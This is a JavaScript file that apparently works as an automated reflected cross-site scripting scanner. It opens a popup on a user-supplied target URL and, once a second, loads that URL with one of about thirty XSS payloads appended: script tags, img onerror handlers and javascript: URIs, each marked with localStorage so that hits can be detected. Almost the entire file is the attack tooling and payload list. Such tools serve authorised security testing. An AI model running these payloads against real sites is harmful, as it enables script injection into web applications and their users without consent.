var w=null;
var target=document.getElementById("target").value;
var prot=target.match(/^http(s)?/);
target=(prot===null)?"http://"+target:target;
var res=document.getElementById("res");
document.getElementsByTagName("a")[0].onclick=function(e){
	w=window.open('http://example.com','_blank');
	if(w==null){
		return true;
	}else{
		alertXSS();
		return false;
	}
}
var alertXSS=function(){
	if(w!=null){
		let exec=null;
		let payloads='\
			"><script>{EXEC}alert()</script>,\
			"><script>{EXEC}alert``</script>,\
			"><script>{EXEC}alert("")</script>,\
			"><script>{EXEC}alert(\'\')</script>,\
			"><script>{EXEC}alert(//)</script>,\
			"><script>{EXEC}alert.apply();</script>,\
			"><img src=""/onerror="{EXEC};alert()">,\
			<script>{EXEC}</script>,\
			<script>{EXEC}</script>,\
			\"><img src="x" onerror=\"{EXEC}\"/>,\
			\"><img src="x" onerror=\"{EXEC}\"/>,\
			<script>{EXEC}</script>,\
			<ScRipT>{EXEC}</ScRipT>,\
			<script>{EXEC}</script>,\
			<script>{EXEC};alert(\"hellox worldss\");</script>,\
			<script>{EXEC}</script>,\
			<script>{EXEC}alert(“XSS”);</script>,\
			<script>{EXEC}alert(‘XSS’)</script>,\
			“><script>{EXEC}alert(“XSS”)</script>,\
			<script>{EXEC}alert(/XSS”)</script>,\
			<script>{EXEC}alert(/XSS/)</script>,\
			</script><script>{EXEC}alert(1)</script>,\
			‘; {EXEC}alert(1);,\
			‘){EXEC}alert(1);//,\
			<ScRiPt>{EXEC}alert(1)</sCriPt>,\
			<IMG SRC=jAVasCrIPt:{EXEC}alert(‘XSS’)>,\
			<IMG SRC=”javascript:{EXEC}alert(‘XSS’);”>,\
			<IMG SRC=javascript:{EXEC}alert(&quot;XSS&quot;)>,\
			<IMG SRC=javascript:{EXEC}alert(‘XSS’)>,\
			<img src=xss onerror={EXEC}alert(1)>,\
		';
		payloads=payloads.split(",");
		i=0;
		l=payloads.length;
		rep=setInterval(function(){
			if(payloads[i]===undefined){
				clearInterval(rep);
			}
			let exec="localStorage.payload"+i+"='Ok';";
			payloads[i]=payloads[i].replace("{EXEC}",exec);
			payload=payloads[i].trim();
			w.location=target+payload;
			console.log(payload);
			res.innerHTML+="\n"+"#".repeat(90)+"\n";
			res.innerHTML+="[+]payload["+i+"]: "+payload;
			res.innerHTML+="\n"+"#".repeat(90)+"\n";
			i++;
		},1000);
	}
};
